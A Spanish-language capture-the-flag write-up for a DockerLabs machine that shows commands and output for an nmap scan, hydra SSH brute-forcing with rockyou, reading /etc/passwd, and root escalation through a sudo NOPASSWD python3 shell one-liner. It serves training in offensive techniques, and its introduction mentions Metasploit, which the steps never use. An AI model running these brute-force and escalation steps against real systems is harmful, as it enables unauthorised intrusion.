# Dockerlabs-Peque-as-Mentirosas
 El reto se centra en la explotación de una vulnerabilidad conocida en un servicio web, utilizando herramientas como Metasploit para obtener acceso inicial al sistema. Posteriormente, se realiza una escalada de privilegios mediante la identificación y explotación de configuraciones inseguras, lo que permite al atacante obtener acceso root.


Ip objetivo 172.17.0.2 
Objetivo: Tener acceso a root


1. Enumeración Inicial 
Se realizó un escaneo con Nmap:
```bash
nmap -sC -sV -p- 172.17.0.2
```
Resultados:
22/tcp -- SSH(OpenSSH)
80/tcp -- HTTP(APACHE2.4.62)

2. Enumeración Web
```bash
curl http://172.17.0.2
```
Resultado: <html><body><h1>Pista: Encuentra la clave para A en los archivos.</h1></body></html>

Análisis: 
Página estática
Sin formularios ni CMS
La pista sugiere credenciales

3. Obtención de credenciales (Usuario a)
```bash
 hydra -l a -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2
 ```
 Resultado:
 [22][ssh] host: 172.17.0.2   login: a   password: secret

 Análisis: La pista hace referencia a un posible ataque de fuerza bruta a través de ssh , asi que porbaremos entrar a través de ssh con esas credenciales

4. Entrada a traves de ssh

 ssh a@172.17.0.2
 password: secret

5. Nos movemos dentro de la maquina
Se enumeran los usuariosd el sistema para identificar posibles vectores de movimiento lateral:
```bash
cat /etc/passwd
```
Resultado: spencer:x:1000:1000::/home/spencer:/bin/bash

6. Obtención de credenciales (Usuario spencer)
```bash
hydra -l spencer -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2
```
Resultado: [22][ssh] host: 172.17.0.2   login: spencer   password: password1

7. Entar a través de ssh con el usuario spencer
ssh spencer@172.17.0.2
password: password1

8. Enumeración local
```bash
sudo -l
```
Resultado: (ALL) NOPASSWD: /usr/bin/python3

Análisis: EL usuario puede ejecutar python3 como root sin contraeña, lo que permite ejecutar código arbitrario con privlegios elevados.

9. Escalda de privilegios
```bash
sudo python3 -c 'import os; os.system("bin/bash")'
```
Resultado: root@09c9c04b4b83:/home/spencer#

10.Conclusión
Este laboratorio demuestra la importancia de:
- Evitar credenciales débiles en servicios expuestos
- Enumerar correctamente usuarios del sistema
- Revisar configuraciones de sudo
El compromiso completo se logró a través de:
- Fuerza bruta sobre SSH
- Movimiento lateral a otro usuario
- Escalada de privilegios meidante python3
